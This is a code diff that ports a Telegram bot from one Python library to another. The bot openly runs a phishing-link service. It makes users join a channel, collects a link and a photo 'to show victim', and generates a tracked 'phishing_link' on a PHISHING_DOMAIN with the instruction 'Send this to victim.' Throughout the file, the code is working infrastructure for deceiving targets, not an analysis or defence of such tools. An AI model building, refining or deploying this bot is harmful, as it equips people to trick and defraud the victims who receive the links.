@@ -2,8 +2,8 @@ import os
 import sqlite3
 import hashlib
 import time
-from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
-from telegram.ext import Updater, CommandHandler, CallbackQueryHandler, MessageHandler, Filters, CallbackContext
+import telebot
+from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
 
 # ========== CONFIG ==========
 BOT_TOKEN = os.environ.get('BOT_TOKEN')
@@ -18,10 +18,13 @@ c.execute('''CREATE TABLE IF NOT EXISTS users
              (user_id INTEGER PRIMARY KEY, username TEXT, link TEXT, photo_id TEXT, unique_code TEXT)''')
 conn.commit()
 
+# ========== BOT ==========
+bot = telebot.TeleBot(BOT_TOKEN)
+
 # ========== FUNCTIONS ==========
-def check_subscription(context, user_id):
+def check_subscription(user_id):
     try:
-        member = context.bot.get_chat_member(chat_id=CHANNEL_USERNAME, user_id=user_id)
+        member = bot.get_chat_member(chat_id=CHANNEL_USERNAME, user_id=user_id)
         return member.status in ['member', 'administrator', 'creator']
     except:
         return False
@@ -31,50 +34,58 @@ def generate_unique_link(user_id):
     return hashlib.md5(raw.encode()).hexdigest()[:10]
 
 # ========== HANDLERS ==========
-def start(update: Update, context: CallbackContext):
-    user_id = update.effective_user.id
-    is_subscribed = check_subscription(context, user_id)
+@bot.message_handler(commands=['start'])
+def start(message):
+    user_id = message.from_user.id
+    is_subscribed = check_subscription(user_id)
     
     if not is_subscribed:
-        keyboard = [[
+        keyboard = InlineKeyboardMarkup(row_width=1)
+        keyboard.add(
             InlineKeyboardButton("📢 Join Channel", url="https://t.me/nrtecno2"),
             InlineKeyboardButton("✅ Verify", callback_data="verify_sub")
-        ]]
-        reply_markup = InlineKeyboardMarkup(keyboard)
-        update.message.reply_text(
+        )
+        bot.reply_to(
+            message,
             "⚠️ *Access Denied!*\n\nYou must join @nrtecno2 first.",
-            reply_markup=reply_markup,
+            reply_markup=keyboard,
             parse_mode="Markdown"
         )
     else:
-        update.message.reply_text("✅ *Verified!*\n\nSend me the **link** you want to share.", parse_mode="Markdown")
+        bot.reply_to(message, "✅ *Verified!*\n\nSend me the **link** you want to share.", parse_mode="Markdown")
         c.execute("INSERT OR REPLACE INTO users (user_id, username) VALUES (?, ?)",
-                  (user_id, update.effective_user.username or 'Unknown'))
+                  (user_id, message.from_user.username or 'Unknown'))
         conn.commit()
 
-def verify(update: Update, context: CallbackContext):
-    query = update.callback_query
-    query.answer()
-    user_id = query.from_user.id
-    is_subscribed = check_subscription(context, user_id)
+@bot.callback_query_handler(func=lambda call: call.data == "verify_sub")
+def verify(call):
+    user_id = call.from_user.id
+    is_subscribed = check_subscription(user_id)
     
     if is_subscribed:
-        query.edit_message_text("✅ *Verified!*\n\nNow send me the **link** you want to share.", parse_mode="Markdown")
+        bot.edit_message_text(
+            "✅ *Verified!*\n\nNow send me the **link** you want to share.",
+            chat_id=call.message.chat.id,
+            message_id=call.message.message_id,
+            parse_mode="Markdown"
+        )
         c.execute("INSERT OR REPLACE INTO users (user_id) VALUES (?)", (user_id,))
         conn.commit()
     else:
-        query.answer("❌ You haven't joined yet!", show_alert=True)
+        bot.answer_callback_query(call.id, "❌ You haven't joined yet!", show_alert=True)
 
-def handle_link(update: Update, context: CallbackContext):
-    user_id = update.effective_user.id
-    link = update.message.text
+@bot.message_handler(func=lambda msg: msg.text and msg.text.startswith('http'))
+def handle_link(message):
+    user_id = message.from_user.id
+    link = message.text
     c.execute("UPDATE users SET link = ? WHERE user_id = ?", (link, user_id))
     conn.commit()
-    update.message.reply_text("📸 *Photo Required!*\n\nNow send a **photo** to show victim.", parse_mode="Markdown")
+    bot.reply_to(message, "📸 *Photo Required!*\n\nNow send a **photo** to show victim.", parse_mode="Markdown")
 
-def handle_photo(update: Update, context: CallbackContext):
-    user_id = update.effective_user.id
-    photo_id = update.message.photo[-1].file_id
+@bot.message_handler(content_types=['photo'])
+def handle_photo(message):
+    user_id = message.from_user.id
+    photo_id = message.photo[-1].file_id
     unique_code = generate_unique_link(user_id)
     
     c.execute("UPDATE users SET photo_id = ?, unique_code = ? WHERE user_id = ?",
@@ -82,27 +93,15 @@ def handle_photo(update: Update, context: CallbackContext):
     conn.commit()
     
     phishing_link = f"{PHISHING_DOMAIN}/{unique_code}"
-    update.message.reply_text(
+    bot.reply_to(
+        message,
         f"✅ *Link Generated!*\n\n🔗 `{phishing_link}`\n\nSend this to victim.",
         parse_mode="Markdown"
     )
 
-def main():
-    if not BOT_TOKEN:
-        print("❌ BOT_TOKEN not set! Add environment variable in Render.")
-        return
-    
-    updater = Updater(BOT_TOKEN, use_context=True)
-    dp = updater.dispatcher
-    
-    dp.add_handler(CommandHandler("start", start))
-    dp.add_handler(CallbackQueryHandler(verify, pattern="verify_sub"))
-    dp.add_handler(MessageHandler(Filters.text & ~Filters.command, handle_link))
-    dp.add_handler(MessageHandler(Filters.photo, handle_photo))
-    
-    updater.start_polling()
+# ========== RUN ==========
+if not BOT_TOKEN:
+    print("❌ BOT_TOKEN not set! Add environment variable in Render.")
+else:
     print("✅ Bot is running!")
-    updater.idle()
-
-if __name__ == '__main__':
-    main()
+    bot.infinity_polling()
